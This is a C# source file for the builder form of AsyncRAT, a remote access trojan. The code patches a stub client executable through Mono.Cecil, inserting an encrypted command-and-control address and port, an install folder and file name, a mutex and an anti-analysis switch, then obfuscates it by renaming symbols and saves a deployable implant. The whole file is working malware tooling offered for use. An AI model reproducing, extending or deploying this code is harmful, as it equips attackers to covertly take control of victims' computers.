using System;
using System.Windows.Forms;
using Mono.Cecil;
using AsyncRAT_Sharp.Helper;
using Mono.Cecil.Cil;
using System.Text;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormBuilder : Form
    {
        public FormBuilder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(10);

            try
            {
                using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(@"Stub/Stub.exe"))
                {
                    WriteSettings(asmDef);

                    Renamer r = new Renamer(asmDef);

                    if (!r.Perform())
                        throw new Exception("renaming failed");

                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Application.StartupPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            r.AsmDef.Write(saveFileDialog1.FileName);
                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            this.Close();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            textPort.Text = Settings.Port;
            txtMutex.Text = Guid.NewGuid().ToString().Substring(10);
            if (Properties.Settings.Default.DNS.Length > 0)
                textIP.Text = Properties.Settings.Default.DNS;
            else
                textIP.Text = "127.0.0.1,127.0.0.1";
            if (Properties.Settings.Default.Filename.Length > 0)
                textFilename.Text = Properties.Settings.Default.Filename;

            if (Properties.Settings.Default.Mutex.Length > 0)
                txtMutex.Text = Properties.Settings.Default.Mutex;
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "Client.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    string operand = methodDef.Body.Instructions[i].Operand.ToString();

                                    if (operand == "6606")
                                        methodDef.Body.Instructions[i].Operand = Settings.AES.Encrypt(textPort.Text);

                                    if (operand == "127.0.0.1")
                                        methodDef.Body.Instructions[i].Operand = Settings.AES.Encrypt(textIP.Text);

                                    if (operand == "false")
                                        methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();

                                    if (operand == "%AppData%")
                                        methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;

                                    if (operand == "Payload.exe")
                                        methodDef.Body.Instructions[i].Operand = textFilename.Text;

                                    if (operand == "NYAN CAT")
                                        methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(Settings.Password));

                                    if (operand == "%MTX%")
                                        methodDef.Body.Instructions[i].Operand = txtMutex.Text;

                                    if (operand == "%Anti%")
                                        methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}